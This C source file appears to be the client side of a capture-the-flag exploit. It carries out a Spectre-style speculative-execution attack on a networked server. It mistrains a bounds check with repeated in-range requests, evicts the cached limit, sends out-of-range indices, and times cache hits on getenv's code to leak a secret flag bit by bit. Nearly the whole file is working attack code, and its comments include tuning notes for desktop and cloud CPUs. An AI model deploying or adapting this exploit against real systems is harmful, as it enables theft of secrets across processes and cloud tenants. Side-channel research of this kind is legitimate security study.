#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <sched.h>
#include <stdio.h>

#include <string.h>
#include <stdlib.h>
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <time.h>

#include "utils.h"
#include "net.h"

//set the ammount of repeats for spectre attack and the time to wait for the speculative execution
#define TRAIN_CYCLES	20
#define WAIT_CYCLES	900

//expected to be in cache if below this ammount of cycles
#define THRESHOLD	150
#define LIMIT_OFFSET 0x090


//in TOTAL_CHECKS executions at least MIN_BIT_1 are expected to speculative execute getenv (or at least fetch the instruction)
#define TOTAL_CHECKS 10000
#define MIN_BIT_1 20
#define MIN_BIT_1_SPEC 0


//define len of flags here
#define MAX_FLAG_1 18

#ifndef BEGIN_INDEX
#define BEGIN_INDEX 0
#endif

#ifndef LAST_INDEX
#define LAST_INDEX 47
#endif

#ifndef SERVER_ADDR
#define SERVER_ADDR "127.0.0.1"
#endif

#define PORT 8080

//bruteforce 128 pages 2^7 to hit a cache set x 6 to fill cache set so 768 access ~ 2^22 bits on a i5-7500
//on the cloud with 45mb of L3 cache is almost impossible to evict the entire set and all of the 20 ways. So evicting the L2 is already good enough
char *flushAux;


int mySocket;


void init(){
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	cpu_set_t mask;
	//make sure to execute on same core
   	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        	perror("sched_setaffinity");
    	}

	//open a dummy file instead of mmaping nothing, avoid cow pages, cache L2+ uses physical address
	flushAux=askmemFname((void *)0x6000000,"/tmp/dummy",PROT_READ|PROT_WRITE);
	printf("flushAux=%p\n",flushAux);
	
}

int ReadBit(unsigned long target){
	int res;
	unsigned t;
	
	//only if speculatvie execution is needed
	if (target >= (MAX_FLAG_1*8)){
	
	
		for(int i=0;i<TRAIN_CYCLES;i++){
			//ask for index 2 , we are sure thats is a 0 because C = 0x43
			SendIndex(3,mySocket);	
		}

		//flushLimit_evict_improved(flushAux,LIMIT_OFFSET); //nope
		flushLimit_evict(flushAux,LIMIT_OFFSET);
	}
	SendIndex(target,mySocket);	
	//give time to process the requests
	for(volatile int i=0;i<WAIT_CYCLES;i++);
	t=probe((char *)getenv);
	return t <THRESHOLD;
}

unsigned char ReadIndex(unsigned long target){
	int bit_0;
	int bit_1;
	int res;
	unsigned long tries;
	unsigned char leakedByte=0;
	unsigned ammount_needed;
	for(int j=0;j<7;j++){
		bit_0=0;
		bit_1=0;
		tries=0;
		if (target >= (MAX_FLAG_1*8)){
			ammount_needed = MIN_BIT_1_SPEC;
		}
		else{
			ammount_needed = MIN_BIT_1;
		}

		while(tries < TOTAL_CHECKS){
			res = ReadBit(target*8+j);

			if (res==1){
				bit_1++;
			}
			if(res==0){
				bit_0++;
			}
			tries++;
			if(bit_1 > ammount_needed){
				break;
			}
		}	
		if (bit_1 > ammount_needed){
			printf("bit 1 tries=%lu\n",tries);
			leakedByte|=(1<<j);
		}
		else{
			printf("bit 0 tries=%lu\n",tries);
		}
	}
	
	return leakedByte;
	
}


int main(){
	unsigned i;
	unsigned long start;
	unsigned char res;
	unsigned char flag[LAST_INDEX+1];
	time_t start_time = time(NULL);
	time_t finish_time;
	memset(flag,0,sizeof(flag));
	createDummyFile();
	usleep(1000*1000*4);
	init();

	//good to knwo
	computeThreshold();
	mySocket=createSocket(SERVER_ADDR);
	if(mySocket<0){
	  exit(1);
	}
	printf("socket = %i\n",mySocket);
	
	
	printf("Using Threshold = %u\n",THRESHOLD);
	
	for (i=BEGIN_INDEX;i<LAST_INDEX;i++){
		res=ReadIndex(i);
		printf("leaked %i: 0x%x \"%c\"\n",i,(int)res,res);
		flag[i-BEGIN_INDEX]=res;
	}
	printf("Flag: %s\n",flag);
	finish_time = time(NULL);
	printf("execution time %lu\n",finish_time-start_time);

	

  return 0;
}

